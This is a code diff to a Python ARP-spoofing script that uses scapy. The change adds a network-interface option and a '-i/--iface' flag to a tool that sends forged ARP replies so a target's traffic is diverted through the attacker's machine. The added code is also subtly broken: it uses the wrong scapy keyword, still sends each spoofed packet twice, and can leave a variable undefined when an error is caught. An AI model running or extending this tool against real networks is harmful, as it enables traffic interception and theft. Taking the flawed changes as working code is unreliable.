@@ -8,6 +8,7 @@ import time
 target_ip = "192.168.1.135"  # Enter your target IP
 spoof_ip = "192.168.1.1"  # Enter your gateway's IP
 attack_gw = False
+interface = None
 delay = 2
 
 
@@ -15,13 +16,26 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    try:
+        if interface is not None:
+            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
+        else:
+            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    except:
+        print("interface is unavailable")
     return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                        psrc=spoof_ip)
+    try:
+        if interface is not None:
+            scapy.send(packet, verbose=False, interface=interface)
+        else:
+            scapy.send(packet, verbose=False)
+    except:
+        print("interface is unavailable")
     scapy.send(packet, verbose=False)
 
 
@@ -76,5 +90,12 @@ if __name__ == "__main__":
             else:
                 index = sys.argv.index("--src")
             spoof_ip = sys.argv[index + 1]
+        if "-i" in sys.argv or "--iface" in sys.argv:
+            index = -1
+            if "-i" in sys.argv:
+                index = sys.argv.index("-i")
+            else:
+                index = sys.argv.index("--iface")
+            interface = sys.argv[index + 1]
 
     main()
